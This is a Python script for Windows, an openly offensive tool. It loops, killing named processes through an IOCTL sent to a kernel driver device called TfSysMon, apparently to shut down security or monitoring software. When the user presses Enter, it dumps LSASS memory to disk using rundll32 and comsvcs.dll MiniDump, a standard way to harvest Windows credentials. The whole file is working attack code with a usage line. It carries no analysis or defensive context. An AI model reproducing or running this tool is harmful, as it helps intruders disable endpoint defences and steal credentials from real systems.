import ctypes
import os
import sys
import time
import threading
import subprocess
from ctypes import wintypes

def get_process_id_by_name(proc_names):
    snapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot(0x00000002, 0)
    if snapshot == -1:
        return []

    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [
            ("dwSize", wintypes.DWORD),
            ("cntUsage", wintypes.DWORD),
            ("th32ProcessID", wintypes.DWORD),
            ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),
            ("th32ModuleID", wintypes.DWORD),
            ("cntThreads", wintypes.DWORD),
            ("th32ParentProcessID", wintypes.DWORD),
            ("pcPriClassBase", ctypes.c_long),
            ("dwFlags", wintypes.DWORD),
            ("szExeFile", ctypes.c_char * 260)
        ]

    entry = PROCESSENTRY32()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
    pids = []
    lower_proc_names = [name.lower() for name in proc_names]

    if ctypes.windll.kernel32.Process32First(snapshot, ctypes.byref(entry)):
        while True:
            proc_name = entry.szExeFile.decode().lower()
            if proc_name in lower_proc_names:
                pids.append(entry.th32ProcessID)
            if not ctypes.windll.kernel32.Process32Next(snapshot, ctypes.byref(entry)):
                break

    ctypes.windll.kernel32.CloseHandle(snapshot)
    return pids

def monitor_and_kill_processes(process_names, device_name, ioctl_code):
    print("[!] Monitoring processes for termination. Press Enter to stop.")
    while True:
        pids = get_process_id_by_name(process_names)
        for pid in pids:
            print(f"[!] Attempting to kill PID: {pid}")
            kill_process_with_driver(device_name, ioctl_code, pid)
        time.sleep(2)  # Check again in 2 seconds to reduce console spam
    
def kill_process_with_driver(device_name, ioctl_code, process_id):
    device_handle = ctypes.windll.kernel32.CreateFileW(
        device_name, 0xC0000000, 0x00000003, None, 3, 0, None
    )
    if device_handle == -1 or device_handle == 0xFFFFFFFF:
        return
    
    ioctl_code = ctypes.c_ulong(ioctl_code & 0xFFFFFFFF)
    class IoctlStruct(ctypes.Structure):
        _fields_ = [
            ("padding", ctypes.c_uint32),
            ("pid", ctypes.c_uint32),
            ("extra_padding", ctypes.c_ubyte * 16)
        ]
    
    ioctl_struct = IoctlStruct(0, process_id, (ctypes.c_ubyte * 16)(*([0] * 16)))
    
    output_buffer = ctypes.create_string_buffer(4)
    bytes_returned = ctypes.c_ulong(0)
    ioctl_result = ctypes.windll.kernel32.DeviceIoControl(
        device_handle, ioctl_code, ctypes.byref(ioctl_struct),
        ctypes.sizeof(ioctl_struct), ctypes.byref(output_buffer),
        ctypes.sizeof(output_buffer), ctypes.byref(bytes_returned), None
    )
    
    ctypes.windll.kernel32.CloseHandle(device_handle)
    
    if ioctl_result != 0:
        print(f"[!] Process with PID {process_id} termination requested via driver.")

def dump_lsass():
    print("[!] Dumping LSASS memory to disk...")
    lsass_pid = get_process_id_by_name(["lsass.exe"])
    if not lsass_pid:
        print("[X] Failed to find LSASS process.")
        return
    
    temp_dump_path = os.path.join(os.environ['TEMP'], "lsass.dmp")
    local_dump_path = os.path.join(os.getcwd(), "lsass.dmp")
    cmd = f"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump {lsass_pid[0]} {temp_dump_path} full"
    subprocess.run(cmd, shell=True)
    
    if os.path.exists(temp_dump_path):
        os.rename(temp_dump_path, local_dump_path)
        print(f"[!] LSASS dump moved to: {local_dump_path}")
    else:
        print("[X] LSASS dump file not found.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python script.py <ProcessName1> <ProcessName2> ...")
        sys.exit(1)
    
    process_names = sys.argv[1:]
    device_name = "\\\\.\\TfSysMon"
    ioctl_code = 0xB4A00404 & 0xFFFFFFFF
    
    monitoring_thread = threading.Thread(target=monitor_and_kill_processes, args=(process_names, device_name, ioctl_code), daemon=True)
    monitoring_thread.start()
    
    input("\n[!] Press Enter to stop monitoring and dump LSASS memory...\n")
    dump_lsass()
